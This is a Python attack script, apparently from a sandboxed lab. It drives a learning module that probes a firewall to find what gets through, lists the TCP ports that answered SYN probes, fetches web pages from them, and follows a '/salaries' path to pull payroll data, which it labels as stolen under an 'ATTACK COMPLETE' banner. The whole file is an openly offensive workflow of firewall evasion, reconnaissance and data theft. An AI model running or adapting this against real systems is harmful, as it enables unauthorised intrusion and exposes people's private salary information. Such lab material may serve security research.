
import sys
sys.path.insert(0, "/lab")

import json
import learner
import packeter

LINE = "=" * 60


def banner(text):
    print(f"\n{LINE}\n  {text}\n{LINE}")


def ports_that_answered(log_path):
    """From our own probe log, find real-source TCP ports that got a
    SYN-ACK — i.e. open doors we discovered. No prior knowledge."""
    open_ports = {}
    for line in open(log_path):
        r = json.loads(line)
        t = r["template"]
        if (t["proto"] == "tcp" and t["src"] == "self"
                and t["flags"] == "S" and r["reply"] == "synack"):
            open_ports[t["dport"]] = open_ports.get(t["dport"], 0) + 1
    return sorted(open_ports)


def main():
    banner("STEP 1 — probe the firewall and learn what gets through")
    learner.run(steps=400, epsilon=0.2, seed=0)

    banner("STEP 2 — investigate the open doors we found")
    doors = ports_that_answered("/results/probes.jsonl")
    print(f"ports that answered a SYN: {doors}")

    stolen = []
    for port in doors:
        t = {"proto": "tcp", "flags": "S", "dport": port, "src": "self", "count": 1}
        page = packeter.grab(t, "/")         
        if not page:
            continue
        print(f"\n--- port {port} responded with: ---")
        body = page.split('\r\n\r\n', 1)[-1]
        print(body.strip()[:300])
        # if the page reveals more paths, follow them
        for path in ("/salaries",):           
            if path in page:
                data = packeter.grab(t, path)
                if data:
                    body = data.split('\r\n\r\n', 1)[-1]
                    print(f"\n>>> pulled {path} from port {port}:")
                    print(body.strip())
                    stolen.append((port, path, body.strip()))

    banner("ATTACK COMPLETE")
    rows = [json.loads(l) for l in open("/results/probes.jsonl")]
    print(f"probes sent      : {len(rows)}")
    print(f"open doors found : {doors}")
    print(f"data stolen from : {[(p, path) for p, path, _ in stolen] or 'nothing'}")


if __name__ == "__main__":
    main()